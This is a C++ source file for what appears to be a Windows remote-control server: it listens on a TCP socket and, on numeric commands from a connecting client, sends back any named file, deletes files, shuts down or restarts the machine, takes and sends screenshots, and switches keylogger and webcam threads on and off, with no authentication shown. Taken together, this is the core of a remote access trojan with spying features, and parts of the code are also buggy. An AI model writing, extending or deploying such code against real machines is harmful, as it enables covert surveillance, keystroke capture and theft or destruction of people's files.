#include "Socket.h"

bool initWinsock = false;
void InitWinsock(WSADATA& wsadata) {
	if (initWinsock) return; 
	WSADATA wsaData;
	int iResult;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "WSAStartup failed: %d\n";
		exit(1);
	}
	initWinsock = true;
}
void CloseWinsock() {
	if (!initWinsock) return;
	WSACleanup();
	initWinsock = false;
}
void ServerSocket::ProcessClientMessage() {
	//When result == "N"?
	int query = 0;
	int index = 0;
	while (buffer[index] != '\0' && buffer[index] <= '9' && buffer[index] >= '0') {
		query = query * 10 + buffer[index] - '0';
		index++;
	}
	if (query == 20) { //Copy file
		string fileName;
		while (buffer[index] != '\0') {
			fileName += buffer[index];
			index++;
		}
		fstream file(fileName, ios::binary || ios::in);
		file.seekg(0, ios::end);
		size_t fileSize = file.tellg();
		file.seekg(0, ios::beg);
		result = "F" + to_string(fileSize);
		Send();
		char fileBuffer[maxBufferSize];
		while (file) {
			file.read(buffer, sizeof(buffer));
			send(clientSocket, buffer, sizeof(buffer), 0);
		}
	}
	else if (query == 17) {
		//How to send message to client, admin after Shut down?
		ShutdownSystem();
		result = "Y";
	}
	else if (query == 18) {
		//How to send message to client, admin after Reset?
		ResetSystem();
		result = "Y";
	}
	else if (query == 21) {
		string filePath = "";
		while (buffer[index] != '\0') {
			filePath += buffer[index];
			index++;
		}
		if (DeleteFile(filePath)) {
			result = "Y";
		}
		else {
			result = "N";
		}
	}
	else if (query == 22) {
		if (CaptureScreen()) {
			fstream file("_Data/screenshot.jpg", ios::binary || ios::in);
			file.seekg(0, ios::end);
			size_t fileSize = file.tellg();
			file.seekg(0, ios::beg);
			result = "F" + to_string(fileSize);
			Send();
			char fileBuffer[maxBufferSize];
			while (file) {
				file.read(buffer, sizeof(buffer));
				send(clientSocket, buffer, sizeof(buffer), 0);
			}
		}
		else {
			result = "N";
		}
	}
	else if (query == 23) {
		isKeyloggerOn = true;
		result = "Y";
	}
	else if (query == 26) {
		isWebcamOn = true;
		result = "Y";
	}
	else if (query == 27) {
		isKeyloggerOn = false;
		result = "Y";
	}
	else if (query == 28) {
		isWebcamOn = false;
		result = "Y";
	}
}
ServerSocket::ServerSocket() {
	isKeyloggerOn = false;
	isWebcamOn = false;
	isServerOn = true;
	keyloggerThread = thread(Keylogger, ref(isKeyloggerOn), ref(isServerOn));
	webcamThread = thread(Webcam, ref(isWebcamOn), ref(isServerOn));
	GetServerAddrInfo();
	listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SetSocketOption();
	if (listenSocket == INVALID_SOCKET) {
		cout << "Socket creation failed: " << WSAGetLastError() << endl;
		WSACleanup();
	}
	BindSocket();
}

